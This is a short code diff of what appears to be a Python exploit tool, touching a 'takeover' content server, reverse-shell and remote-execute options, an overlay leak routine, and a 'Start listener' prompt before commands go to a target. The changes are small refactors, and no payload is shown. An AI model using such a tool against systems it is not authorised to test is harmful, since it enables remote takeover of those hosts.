@@ -287,7 +287,7 @@ def dst_command_req():
     
     if (args.takeover):
         import threading
-        http_srv_thread = threading.Thread(target=takeover.run_server, args=(listen_ip, listen_port))
+        http_srv_thread = threading.Thread(target=takeover.run_server, args=(listen_port,))
         logging("+ Starting content server (will run until QUIT is received from target)\n")
         http_srv_thread.start()
 
@@ -310,7 +310,6 @@ def dst_command_req():
         logging("+ QUIT received. Stopping content server\n")
         http_srv_thread.join()
 
-
     stage += 1
 
 
@@ -330,9 +329,9 @@ def main():
     if (args.overlay_leak or args.overlay_leak_command):
         overlay_leak()
 
-    if (args.takeover or args.reverse or args.execute != None):
-        if not args.quiet:
-            if not args.auto:
+    if (args.takeover) or (args.reverse) or (args.execute != None):
+        if (not args.quiet):
+            if (not args.takeover) and (not args.auto):
                 input("= Start listener and press Enter to continue...")
         dst_command_req()
     
